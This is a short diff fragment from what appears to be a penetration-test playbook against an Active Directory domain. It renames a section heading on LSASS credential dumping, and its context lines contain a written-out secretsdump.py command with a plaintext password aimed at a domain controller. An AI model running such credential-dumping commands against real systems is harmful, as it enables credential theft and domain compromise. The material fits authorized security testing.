@@ -60,7 +60,7 @@ Already executed during recon (Section 1.2) — inherently a single unauthentica
 ```bash
 secretsdump.py corpnet.local/svc-monitor:'Monitor2024!'@192.168.100.1
 ```
-#### 3.4 LSASS Credential Dumping
+#### 3.4 Workstation Credential Access — LSASS
 Precondition check — confirm you actually have local admin before attempting this:
 ```bash
 # From KALI-ATK, using credentials obtained from an earlier step (e.g. cracked Kerberoasting hash)
